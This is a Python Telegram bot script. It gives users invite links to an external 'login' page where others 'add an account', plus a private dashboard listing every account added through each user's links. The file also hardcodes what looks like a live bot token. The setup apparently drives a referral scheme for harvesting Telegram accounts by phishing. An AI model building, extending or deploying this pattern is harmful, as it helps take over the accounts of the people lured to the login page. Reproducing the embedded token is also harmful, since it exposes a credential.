"""
⚠️ WARNING: This file contains hardcoded credentials. 
For security, use environment variables instead.
"""

import os
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, ContextTypes

# ========== HARDCODED CONFIGURATION (INSECURE) ==========
BOT_TOKEN = "8210146562:AAHvM54C4KvHsf-YfAjOC9VLe6o1l-gEtBM"
WEBAPP_URL = "https://e-gram-98zv.onrender.com"
# =========================================================

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Send invite link when /start is issued."""
    user_id = update.effective_user.id
    invite_link = f"{WEBAPP_URL}/login?inviter={user_id}"
    
    keyboard = [[InlineKeyboardButton("➕ Add Account", url=invite_link)]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        f"🔗 **Your invite link:**\n{invite_link}\n\n"
        "Share this link with others. When they add an account via this link, "
        "you'll see it in your private dashboard.",
        reply_markup=reply_markup,
        parse_mode="Markdown"
    )

async def dashboard(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Send link to private dashboard."""
    user_id = update.effective_user.id
    dash_link = f"{WEBAPP_URL}/user-dashboard?inviter={user_id}"
    
    await update.message.reply_text(
        f"📊 **Your private dashboard:**\n{dash_link}\n\n"
        "Here you can see all accounts added via your invite links.",
        parse_mode="Markdown"
    )

def main():
    """Start the bot."""
    # Create application
    app = Application.builder().token(BOT_TOKEN).build()
    
    # Register handlers
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("dashboard", dashboard))
    
    # Start polling
    print("Bot started. Press Ctrl+C to stop.")
    app.run_polling()

if __name__ == "__main__":
    main()
